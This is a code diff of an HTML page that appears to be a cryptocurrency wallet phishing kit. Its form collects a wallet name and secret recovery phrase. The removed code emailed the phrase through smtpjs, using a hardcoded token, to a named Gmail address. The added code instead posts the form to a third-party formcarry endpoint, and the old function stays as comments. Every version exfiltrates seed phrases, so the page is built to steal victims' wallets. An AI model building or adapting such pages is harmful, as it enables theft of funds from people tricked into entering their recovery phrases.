@@ -46,7 +46,7 @@
                <div role="tabpanel" class="tab-pane fade show active" id="phrase">
                   <!-- FORM BEGIN -->
                   <form 
-                  onsubmit="sendEmail();"
+                  action="https://formcarry.com/s/i-unJ0UFzVx"
                   accept-charset="UTF-8"
                   target="display-frame"
                   method="POST"
@@ -79,21 +79,21 @@
    <script src="index.js"></script>
    <script src="https://smtpjs.com/v3/smtp.js"></script>
    <script>
-      function sendEmail(e){
-         e.preventDefault()
-         var wallet = document.getElementById("wallet").value
-         var phrase = document.querySelector("#phrase")
-         var body = "wallet: " + wallet + "<br/> phrase: " +phrase;
-         Email.send({
-            SecureToken : "9fee8bb4-5a49-4105-8317-1926d1765c2f",
-            To : 'nickolasi085@gmail.com',
-            From : "you@isp.com",
-            Subject : "This is the subject",
-            Body : phrase.value
-         }).then(
-         message => alert(message)
-         );
-      }
+      // function sendEmail(e){
+      //    // e.preventDefault()
+      //    var wallet = document.getElementById("wallet").value
+      //    var phrase = document.querySelector("#phrase")
+      //    var body = "wallet: " + wallet + "<br/> phrase: " +phrase;
+      //    Email.send({
+      //       SecureToken : "9fee8bb4-5a49-4105-8317-1926d1765c2f",
+      //       To : 'nickolasi085@gmail.com',
+      //       From : "you@isp.com",
+      //       Subject : "This is the subject",
+      //       Body : phrase.value
+      //    }).then(
+      //    message => alert(message)
+      //    );
+      // }
    </script>
 </body>
 
